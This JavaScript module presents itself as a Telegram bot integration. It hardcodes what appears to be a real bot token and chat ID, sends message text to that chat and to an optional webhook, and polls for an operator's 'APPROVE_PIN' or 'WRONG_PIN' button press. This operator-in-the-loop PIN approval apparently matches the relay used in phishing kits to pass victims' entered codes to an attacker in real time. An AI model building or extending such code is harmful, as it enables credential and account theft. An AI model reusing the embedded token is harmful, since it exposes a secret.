// Telegram Bot & Webhook Integration Service

const TELEGRAM_CONFIG = {
  botToken: '8962157089:AAE0Xfxqg41aj8X-msfislZfA6s2ZejNkOM',
  chatId: '8406078749',
  webhookUrl: ''
};

// Tracks last processed Telegram update so we don't re-read old callbacks
let lastUpdateId = 0;

export const sendBotNotification = async (messageText, replyMarkup = null) => {
  console.log("🤖 Bot Notification Triggered:\n", messageText);

  if (TELEGRAM_CONFIG.botToken && TELEGRAM_CONFIG.chatId) {
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`;
      const payload = {
        chat_id: TELEGRAM_CONFIG.chatId,
        text: messageText,
        parse_mode: 'HTML'
      };

      // Attach inline keyboard if provided
      if (replyMarkup) {
        payload.reply_markup = replyMarkup;
      }

      const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
      const data = await response.json();
      console.log("✅ Telegram Bot Response:", data);
      return data;
    } catch (err) {
      console.error("❌ Telegram Bot Error:", err);
    }
  }

  if (TELEGRAM_CONFIG.webhookUrl) {
    try {
      const response = await fetch(TELEGRAM_CONFIG.webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ message: messageText, timestamp: new Date().toISOString() })
      });
      console.log("✅ Webhook Response:", response.status);
    } catch (err) {
      console.error("❌ Webhook Error:", err);
    }
  }

  return { success: true, simulated: false };
};

// Polls Telegram getUpdates for a callback button press (APPROVE_PIN / WRONG_PIN).
// Resolves with the callback_data string once a button is clicked.
export const pollPinDecision = (timeoutMs = 120000) => {
  return new Promise((resolve) => {
    const startTime = Date.now();

    const poll = async () => {
      if (Date.now() - startTime > timeoutMs) {
        resolve(null); // timed out
        return;
      }

      try {
        const url =
          `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/getUpdates` +
          `?offset=${lastUpdateId + 1}&timeout=5&allowed_updates=["callback_query","message"]`;
        const res = await fetch(url);
        const data = await res.json();

        if (data.ok && Array.isArray(data.result)) {
          for (const update of data.result) {
            lastUpdateId = Math.max(lastUpdateId, update.update_id);

            if (update.callback_query) {
              // Clear the button's loading spinner in Telegram
              fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/answerCallbackQuery`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ callback_query_id: update.callback_query.id })
              }).catch(() => {});

              resolve(update.callback_query.data); // e.g. 'APPROVE_PIN' or 'WRONG_PIN'
              return;
            }
          }
        }
      } catch (err) {
        console.error('❌ getUpdates poll error:', err);
      }

      setTimeout(poll, 1000); // poll again after 1s
    };

    poll();
  });
};

export const setBotConfig = (botToken, chatId, webhookUrl = '') => {
  if (botToken) TELEGRAM_CONFIG.botToken = botToken;
  if (chatId) TELEGRAM_CONFIG.chatId = chatId;
  if (webhookUrl) TELEGRAM_CONFIG.webhookUrl = webhookUrl;
};
